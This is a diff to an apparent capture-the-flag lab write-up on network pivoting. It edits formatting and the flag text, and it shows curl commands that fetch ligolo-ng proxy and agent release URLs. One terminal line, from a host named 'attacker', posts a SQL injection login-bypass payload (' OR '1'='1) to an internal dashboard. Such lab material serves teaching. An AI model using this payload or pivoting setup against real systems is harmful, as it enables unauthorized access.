@@ -94,14 +94,17 @@ uname -m
 curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url
 ```
 
-Recommended: automatically pick the *latest* Linux amd64 URLs from the GitHub API:
+Recommended: automatically pick the _latest_ Linux amd64 URLs from the GitHub API:
+
 ```bash
 # this will give you the url's directly
 curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'proxy' | head -n 1 | cut -d '\"' -f 4
 
 curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'agent' | head -n 1 | cut -d '\"' -f 4
 ```
+
 then download them usinf curl or wget
+
 ```bash
 curl -L -o proxy.tgz "proxy_you_found"
 curl -L -o agent.tgz "agent_you_found"
@@ -207,7 +210,7 @@ vagrant@attacker:~$ curl -X POST -d "username=' OR '1'='1&password=' OR '1'='1" 
     <h1>Welcome, </h1>
     <p>Your internal dashboard has loaded successfully.</p>
     <h2>Secure Message</h2>
-    <pre>CTF{pivot_master_2024}</pre>
+    <pre>CyberZ{reached_the_target}</pre>
   </section>
 </body>
 </html>
